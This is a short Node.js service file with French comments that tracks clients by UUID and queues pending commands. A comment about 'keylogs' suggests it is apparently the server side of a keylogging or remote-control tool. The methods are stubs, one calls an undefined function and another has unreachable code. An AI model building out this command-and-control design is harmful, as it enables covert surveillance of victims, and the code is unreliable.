'use strict'

const Client = require('../models/Client')
const clientDao = require('../dao/clientDao')
//const { now } = require('sequelize/types/lib/utils')

const clientService = {
    
    createOrUpdate: async function (uuid) {
        
        // Call the DAO to find if a user exists or not
        const client = await clientDao.findOneByUuid(uuid)

        // If he doesn't exist, then we create it
        if (!(client instanceof Client)) {
            return this.create()
        }
        
        // If he does exist, then we update it
        return this.update(client)
    },
    create: async function () {
        
        const client = await clientDao.insertOne()
        
        return client
    },
    update: async function (client) {
        
        // Do updating operations ...
        
        return client
    },

    getCommands: async function (uuid) {

        //Appeler la couche DAO pour voir les commandes en attente pour le UUID
        return findPendingCommandsByUuid()
    },
    addCommand: async function (uuid) {

        // Permet d'ajouter une commande à la liste des commandes en attente

        // Check si déjà une commande en attente (keylogs)
        // Si oui, alors message erreur sur le front 
        return false
        // Si non, on ajoute à la liste d'attente
        return true
    }
}

module.exports = clientService